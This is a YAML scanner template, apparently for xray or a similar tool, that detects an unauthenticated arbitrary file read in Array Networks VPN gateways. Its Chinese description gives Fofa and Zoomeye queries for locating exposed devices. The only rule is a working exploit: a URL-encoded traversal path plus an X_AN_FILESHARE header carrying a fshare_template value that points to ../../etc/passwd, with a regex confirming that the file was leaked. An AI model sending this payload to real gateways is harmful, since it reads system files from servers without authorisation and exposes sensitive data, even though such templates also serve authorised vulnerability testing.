id: ArrayVPN-addfolder-fileread

info:
  name: ArrayVPN任意文件读取漏洞
  author: Y3y1ng
  severity: high
  verified: true
  description: |-
    Array的 fshare_template 接口可构造特定的请求包进行未授权任意文件读取，从而造成服务器敏感信息泄露。
    Fofa: app="Array-VPN"
    Zoomeye: app:"Array Networks secure access gateways VPN server httpd"
  reference:
    - https://mp.weixin.qq.com/s/pJQIAox1EK9gE-XHF62UuQ
  tags: Array,VPN,fileread
  created: 2023/12/04

rules:
  r0:
    request:
      method: GET
      path: /prx/000/http/localhost/client_sec/%25%30%30%2e%2e%2f%2e%2e%2f%2e%2e%2f%61%64%64%66%6f%6c%64%65%72
      headers: 
        X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd
    expression: |
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()